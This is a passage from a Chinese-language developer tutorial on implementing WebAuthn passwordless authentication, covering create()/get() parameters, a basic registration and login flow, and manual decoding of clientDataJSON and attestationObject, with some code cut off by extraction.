href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let 